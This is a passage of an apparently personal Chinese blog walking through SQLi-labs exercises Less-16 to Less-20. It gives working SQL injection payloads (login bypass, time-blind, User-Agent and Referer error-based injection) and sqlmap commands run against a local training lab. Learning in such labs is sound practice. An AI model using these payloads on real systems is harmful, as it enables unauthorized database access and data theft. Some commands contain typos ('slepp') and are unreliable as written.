&lt;p&gt;同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-16&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;username 输入 &lt;code&gt;admin&amp;quot;) or 1=1 -- &lt;/code&gt; 直接登录成功，不要忘记–后面的空格哈&lt;/p&gt;
&lt;p&gt;因为可以根据图片的显示判断，所以其实时间盲注还是布尔盲注都是可以的呀，只是前面那道题用过布尔盲注了，这里就用时间盲注&lt;/p&gt;
&lt;p&gt;老规矩先判断数据库长度是 8：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;admin&amp;quot;) and length(database())=8 -- &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后搬砖找 bp，send to Intruder：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&amp;quot;) and if(ascii(substr(database(),§1§,1))=§8§,slepp(23),1)--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;request&lt;/th&gt;
&lt;th&gt;payload1&lt;/th&gt;
&lt;th&gt;payload2&lt;/th&gt;
&lt;th&gt;status&lt;/th&gt;
&lt;th&gt;timeout&lt;/th&gt;
&lt;th&gt;error&lt;/th&gt;
&lt;th&gt;length&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;787&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;802&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;838&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;909&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;913&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;927&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;932&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;968&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1712&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1749&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1749&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;总结-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-16&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;bp 真好，sqlmap 真好，搬砖真难&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-17sqlmaping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-17sqlmaping&#34;&gt;#&lt;/a&gt; Less-17（sqlmaping）&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 22:54:56&lt;/p&gt;
&lt;h2 id=&#34;过程-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-17&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看见题目又开心了起来，不是盲注啦&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-17&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;bp 抓包右键 copy to file 生成 17.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -r 17.txt --risk=3 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-17&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;username 输入 &lt;code&gt;admin&#39; or 1=1 -- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;竟然返回 bug off，you silly dump hacker&lt;/p&gt;
&lt;p&gt;哦豁，骂我，我要干你，等着&lt;/p&gt;
&lt;p&gt;我怀疑后台判断了用户输入，然后无数次尝试无数次被骂，我决定偷偷看一下源码&lt;/p&gt;
&lt;p&gt;源码中对 uname 限制了只能 15 个字符，单是这个就已经很无力了，后来看完源码才发现这是一个重置密码的表单，而且源码中并没有对 passwd 做限制&lt;/p&gt;
&lt;p&gt;眼瞎的我决定用时间盲注，bp send to repeater：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;amp;passwd=1&amp;#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哈哈 服务器睡着啦，随后时间盲注就可以了，和上面的题目一样&lt;/p&gt;
&lt;h2 id=&#34;总结-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-17&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;感觉用得多的还是盲注&lt;/p&gt;
&lt;p&gt;盲注手工注入最快就是用二分法，但是我是有 bp 的人！&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;–risk=RISK 风险（1-4，默认 1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试；risk 3：or 语句的测试；risk 4：update 的测试&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-18&#34;&gt;#&lt;/a&gt; Less-18&lt;/h1&gt;
&lt;p&gt;date：2020-11-22 00:19:07&lt;/p&gt;
&lt;h2 id=&#34;过程-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-18&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;题目提示，Your IP ADDRESS is: 127.0.0.1，这题我会！肯定是 xff 头注入！（结果不是）&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-18&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;bp 抓包右键 copy to file 生成 18.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-18&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;既然不是 xff 头，那就看一下源码把&lt;/p&gt;
&lt;p&gt;源码中对账户密码进行了判断，必须要绕过去才能进行头注入，刚好上一题重置了密码&lt;/p&gt;
&lt;p&gt;那么就输入相应的账户密码，再在 user-agent 上注入就好啦，先来个单引号报错：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&amp;#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;amp;passwd=1&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your IP ADDRESS is: 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 3 &amp;gt;&amp;lt;/font&amp;gt;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size = 3 &amp;gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&amp;#x27;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;127.0.0.1&amp;#x27;, &amp;#x27;admin&amp;#x27;)&amp;#x27; at line 1&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot;  /&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;讲道理这里肯定是插入操作，那就是 insert 注入咯，源码确实是 insert，其实不管是什么注入，只要能大概弄 sql 语句，顺利让数据库执行我们的代码即可&lt;/p&gt;
&lt;p&gt;拿 database () 这里利用报错注入，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&amp;#x27;,1,extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;amp;passwd=1&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出，拿到当前数据库 security：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your IP ADDRESS is: 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 3 &amp;gt;&amp;lt;/font&amp;gt;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size = 3 &amp;gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&amp;#x27;,1,extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database())))#&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;XPATH syntax error: &amp;#x27;~security&amp;#x27;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot;  /&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面爆字段值同 less-11，改一下 payload 即可&lt;/p&gt;
&lt;h2 id=&#34;总结-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-18&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;看源码，就像考试作弊，心怀愧疚～～（跃跃欲试）~~&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;level 参数：&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;1 &amp;gt; 探测等级： --level 5&lt;/p&gt;
&lt;p&gt;–level 5 指的是需要执行的测试等级&lt;/p&gt;
&lt;p&gt;一共有 5 个等级（1-5） 不加 level 时，默认是 1&lt;/p&gt;
&lt;p&gt;5 级包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。&lt;/p&gt;
&lt;p&gt;level=2 http cookie 会测试&lt;/p&gt;
&lt;p&gt;level=3 http user-agent/referer 头会测试&lt;/p&gt;
&lt;p&gt;在不能确定哪个 payload 或参数为注入点时，建议使用高的 level 值。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-19&#34;&gt;#&lt;/a&gt; Less-19&lt;/h1&gt;
&lt;p&gt;date：2020-11-22 10:01:30&lt;/p&gt;
&lt;h2 id=&#34;过程-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-19&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-19&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;bp 抓包右键 copy to file 生成 19.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-19&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;看标题，referer 注入，看来后面的题目都是头注入了&lt;/p&gt;
&lt;p&gt;打开 hackbar，点击 post data，输入正确的用户名密码，提示我的 referer 是啥啥啥，再次确定就是 referer 头注入&lt;/p&gt;
&lt;p&gt;不知道为啥 hackbar 同时搞 postdata 和 referer，referer 没有起作用，上 bp：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&amp;#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;amp;passwd=1&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your IP ADDRESS is: 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 3 &amp;gt;&amp;lt;/font&amp;gt;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size = 3 &amp;gt;Your Referer is: http://www.sqli-labs.com/Less-19/&amp;#x27;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot; /&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;又是 insert 操作啦，利用报错注入 extractvalue () 拿当前数据库名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&amp;#x27;, extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;amp;passwd=1&amp;amp;submit=Submit &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据输出，拿到当前数据库名 security：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your IP ADDRESS is: 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 3 &amp;gt;&amp;lt;/font&amp;gt;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size = 3 &amp;gt;Your Referer is: http://www.sqli-labs.com/Less-19/&amp;#x27;, extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database()))) #&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;XPATH syntax error: &amp;#x27;~security&amp;#x27;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot; /&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续操作同 less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-19&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;sqlmap 新操作，感觉它不太行了？应该是我不太行，去百度 sqlmap 的使用姿势&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-20&#34;&gt;#&lt;/a&gt; Less-20&lt;/h1&gt;
&lt;p&gt;date：2020-11-22 10:17:02&lt;/p&gt;
&lt;h2 id=&#34;过程-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-20&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-20&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;bp 抓包右键 copy to file 生成 20.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-20&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;先用 admin\1 登录&lt;/p&gt;
&lt;p&gt;题目给了我的 cookie：&lt;/p&gt;
